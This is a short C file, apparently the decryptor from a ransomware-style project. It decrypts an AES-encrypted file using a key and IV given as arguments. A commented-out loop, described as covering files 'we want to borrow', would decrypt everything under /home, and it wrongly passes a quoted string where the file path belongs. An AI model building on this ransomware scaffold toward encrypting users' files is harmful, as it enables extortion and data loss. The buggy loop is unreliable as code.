#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "lib/aes.h"

#include "files.h"
#include "encryption.h"

int main(int argc, char *argv[]){
    //Retrieve key and IV
    size_t key_length = 32;
    uint8_t key[key_length];
    hexStringToBytes(argv[1], key, key_length);

    size_t iv_length = 16;
    uint8_t iv[iv_length];
    hexStringToBytes(argv[2], iv, iv_length);


    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    decryptFile(ctx, "a.txt.cha");
    /*

    //List all the files we want to borrow ;)
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Decrypt each file with AES
        decryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);
     */
}